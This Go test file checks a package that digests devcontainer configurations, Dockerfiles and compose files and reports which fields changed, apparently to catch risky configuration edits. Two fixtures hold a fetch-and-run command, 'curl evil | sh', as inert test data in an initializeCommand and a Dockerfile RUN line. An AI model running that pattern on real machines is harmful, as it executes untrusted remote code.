package guard

import (
	"os"
	"path/filepath"
	"slices"
	"strings"
	"testing"
)

func digest(t *testing.T, merged string, files map[string]string) Digest {
	t.Helper()
	dir := t.TempDir()
	config := filepath.Join(dir, ".devcontainer", "devcontainer.json")
	if err := os.MkdirAll(filepath.Dir(config), 0o755); err != nil {
		t.Fatal(err)
	}
	var paths []string
	for name, content := range files {
		p := filepath.Join(filepath.Dir(config), name)
		if err := os.WriteFile(p, []byte(content), 0o600); err != nil {
			t.Fatal(err)
		}
		paths = append(paths, p)
	}
	d, err := DigestOf([]byte(merged), config, paths)
	if err != nil {
		t.Fatalf("DigestOf: %v", err)
	}
	return d
}

func TestDigestIsStableForTheSameConfiguration(t *testing.T) {
	a := digest(t, `{"image":"ubuntu","features":{"x":{}}}`, nil)
	b := digest(t, `{"features":{"x":{}},  "image":"ubuntu"}`, nil)
	if a.Sum != b.Sum {
		t.Errorf("reordered keys changed the digest: %s vs %s", a.Sum, b.Sum)
	}
	if !strings.HasPrefix(a.Sum, "sha256:") {
		t.Errorf("sum %q has no algorithm prefix", a.Sum)
	}
}

// configFilePath names a temporary directory on each run, so it must not count.
func TestDigestIgnoresWhereTheConfigWasRead(t *testing.T) {
	a := digest(t, `{"image":"ubuntu","configFilePath":{"fsPath":"/tmp/dev-override-1/devcontainer.json"}}`, nil)
	b := digest(t, `{"image":"ubuntu","configFilePath":{"fsPath":"/tmp/dev-override-2/devcontainer.json"}}`, nil)
	if a.Sum != b.Sum {
		t.Error("the config's temporary path changed the digest")
	}
}

func TestDigestChangesWithWhatRuns(t *testing.T) {
	base := digest(t, `{"image":"ubuntu","features":{"x":{"v":"1"}}}`, nil)
	for name, other := range map[string]Digest{
		"feature option": digest(t, `{"image":"ubuntu","features":{"x":{"v":"2"}}}`, nil),
		"init command":   digest(t, `{"image":"ubuntu","features":{"x":{"v":"1"}},"initializeCommand":"curl evil | sh"}`, nil),
	} {
		if other.Sum == base.Sum {
			t.Errorf("%s did not change the digest", name)
		}
	}
}

func TestDigestCoversTheDockerfile(t *testing.T) {
	merged := `{"build":{"dockerfile":"Dockerfile"}}`
	a := digest(t, merged, map[string]string{"Dockerfile": "FROM ubuntu\n"})
	b := digest(t, merged, map[string]string{"Dockerfile": "FROM ubuntu\nRUN curl evil | sh\n"})
	if a.Sum == b.Sum {
		t.Error("a changed Dockerfile did not change the digest")
	}
	if !slices.Contains(a.Files, "Dockerfile") {
		t.Errorf("files = %v, want the Dockerfile named", a.Files)
	}
}

func TestDigestCoversComposeFiles(t *testing.T) {
	merged := `{"dockerComposeFile":"compose.yml","service":"app"}`
	a := digest(t, merged, map[string]string{"compose.yml": "services: {app: {image: x}}\n"})
	b := digest(t, merged, map[string]string{"compose.yml": "services: {app: {image: x, privileged: true}}\n"})
	if a.Sum == b.Sum {
		t.Error("a changed compose file did not change the digest")
	}
}

func TestDiffNamesWhatChanged(t *testing.T) {
	merged := `{"build":{"dockerfile":"Dockerfile"},"image":"a","remoteUser":"vscode"}`
	a := digest(t, merged, map[string]string{"Dockerfile": "FROM a\n"})
	b := digest(t, `{"build":{"dockerfile":"Dockerfile"},"image":"b","remoteUser":"vscode","runArgs":["--x"]}`,
		map[string]string{"Dockerfile": "FROM b\n"})
	got := Diff(a, b)
	for _, want := range []string{"image", "runArgs", "Dockerfile"} {
		if !slices.Contains(got, want) {
			t.Errorf("Diff = %v, lacks %q", got, want)
		}
	}
	if slices.Contains(got, "remoteUser") {
		t.Errorf("Diff = %v names an unchanged field", got)
	}
}

func TestDigestOfAMissingDockerfileIsAnError(t *testing.T) {
	dir := t.TempDir()
	config := filepath.Join(dir, "devcontainer.json")
	if _, err := DigestOf([]byte(`{"build":{"dockerfile":"Dockerfile"}}`), config, nil); err == nil {
		t.Error("a Dockerfile that is not there was digested as if absent")
	}
}

func TestRecordRoundTripsForDiff(t *testing.T) {
	merged := `{"build":{"dockerfile":"Dockerfile"},"image":"a","remoteUser":"vscode"}`
	stored := digest(t, merged, map[string]string{"Dockerfile": "FROM a\n"})
	back := ParseRecord(stored.Sum, stored.Record())
	if back.Sum != stored.Sum || len(Diff(back, stored)) != 0 {
		t.Errorf("round trip differs: %v", Diff(back, stored))
	}
	live := digest(t, `{"build":{"dockerfile":"Dockerfile"},"image":"b","remoteUser":"vscode"}`,
		map[string]string{"Dockerfile": "FROM a\n"})
	if got := Diff(back, live); !slices.Equal(got, []string{"image"}) {
		t.Errorf("Diff = %v, want [image]", got)
	}
	// Hashes only, not values.
	if strings.Contains(stored.Record(), "vscode") {
		t.Errorf("the record holds a field's value: %s", stored.Record())
	}
}

func TestParseRecordOfNothingDiffsAsAllNew(t *testing.T) {
	live := digest(t, `{"image":"a"}`, nil)
	if got := Diff(ParseRecord("sha256:x", ""), live); !slices.Equal(got, []string{"image"}) {
		t.Errorf("Diff = %v", got)
	}
}

// Tree mounts follow the host's git config, so they must not change the digest.
func TestWithoutMountsDropsOnlyTheNamedTargets(t *testing.T) {
	merged := `{"image":"x","mounts":["source=/h/r/.githooks,target=/workspaces/r/.githooks,type=bind,readonly",` +
		`{"source":"/h/r/tools","target":"/workspaces/r/tools","type":"bind"},"source=v,target=/var/dev-state,type=volume"]}`
	out, err := WithoutMounts([]byte(merged), []string{"/workspaces/r/.githooks", "/workspaces/r/tools"})
	if err != nil {
		t.Fatal(err)
	}
	with, err := DigestOf(out, "", nil)
	if err != nil {
		t.Fatal(err)
	}
	without, err := DigestOf([]byte(`{"image":"x","mounts":["source=v,target=/var/dev-state,type=volume"]}`), "", nil)
	if err != nil {
		t.Fatal(err)
	}
	if with.Sum != without.Sum {
		t.Errorf("digest still sees the tree mounts: %s", out)
	}
}

func TestImageDiffIgnoresEntriesThatDoNotDecideTheImage(t *testing.T) {
	a := digest(t, `{"image":"ubuntu","mounts":["source=a,target=/a,type=bind"],"containerEnv":{"X":"1"},"remoteUser":"vscode"}`, nil)
	b := digest(t, `{"image":"ubuntu","mounts":["source=b,target=/b,type=bind"],"containerEnv":{"X":"2"},"remoteUser":"root","runArgs":["--x"]}`, nil)
	if got := ImageDiff(a, b); len(got) != 0 {
		t.Errorf("ImageDiff = %v, want none", got)
	}
}

func TestImageDiffNamesTheImageDecidingFields(t *testing.T) {
	base := digest(t, `{"image":"ubuntu","features":{"x":{"v":"1"}},"build":{"dockerfile":"Dockerfile"}}`,
		map[string]string{"Dockerfile": "FROM ubuntu\n"})
	for name, other := range map[string]struct {
		merged string
		want   []string
	}{
		"image":    {`{"image":"debian","features":{"x":{"v":"1"}},"build":{"dockerfile":"Dockerfile"}}`, []string{"image"}},
		"features": {`{"image":"ubuntu","features":{"x":{"v":"2"}},"build":{"dockerfile":"Dockerfile"}}`, []string{"features"}},
		"build":    {`{"image":"ubuntu","features":{"x":{"v":"1"}},"build":{"dockerfile":"Dockerfile","args":{"A":"1"}}}`, []string{"build"}},
	} {
		got := ImageDiff(base, digest(t, other.merged, map[string]string{"Dockerfile": "FROM ubuntu\n"}))
		if !slices.Equal(got, other.want) {
			t.Errorf("%s: ImageDiff = %v, want %v", name, got, other.want)
		}
	}
}

func TestImageDiffNamesAChangedDockerfile(t *testing.T) {
	merged := `{"build":{"dockerfile":"Dockerfile"}}`
	a := digest(t, merged, map[string]string{"Dockerfile": "FROM a\n"})
	b := digest(t, merged, map[string]string{"Dockerfile": "FROM a\nRUN true\n"})
	if got := ImageDiff(a, b); !slices.Equal(got, []string{"Dockerfile"}) {
		t.Errorf("ImageDiff = %v, want [Dockerfile]", got)
	}
}

func TestImageDiffCountsAOneSidedEntryAsADifference(t *testing.T) {
	withFeatures := digest(t, `{"image":"ubuntu","features":{"x":{}}}`, nil)
	without := digest(t, `{"image":"ubuntu"}`, nil)
	if got := ImageDiff(withFeatures, without); !slices.Equal(got, []string{"features"}) {
		t.Errorf("ImageDiff = %v, want [features]", got)
	}
	if got := ImageDiff(without, withFeatures); !slices.Equal(got, []string{"features"}) {
		t.Errorf("ImageDiff reversed = %v, want [features]", got)
	}
	withDockerfile := digest(t, `{"build":{"dockerfile":"Dockerfile"}}`, map[string]string{"Dockerfile": "FROM a\n"})
	noDockerfile := digest(t, `{"image":"ubuntu"}`, nil)
	if got := ImageDiff(withDockerfile, noDockerfile); !slices.Equal(got, []string{"Dockerfile", "build", "image"}) {
		t.Errorf("ImageDiff = %v, want [Dockerfile build image]", got)
	}
}

func TestImageDiffOfStoredAndLiveDigests(t *testing.T) {
	merged := `{"build":{"dockerfile":"Dockerfile"},"image":"a","remoteUser":"vscode"}`
	live := digest(t, merged, map[string]string{"Dockerfile": "FROM a\n"})
	stored := ParseRecord(live.Sum, live.Record())
	if got := ImageDiff(stored, live); len(got) != 0 {
		t.Errorf("stored vs live ImageDiff = %v, want none", got)
	}
	changed := digest(t, `{"build":{"dockerfile":"Dockerfile"},"image":"b","remoteUser":"vscode"}`,
		map[string]string{"Dockerfile": "FROM a\n"})
	if got := ImageDiff(stored, changed); !slices.Equal(got, []string{"image"}) {
		t.Errorf("stored vs changed ImageDiff = %v, want [image]", got)
	}
}
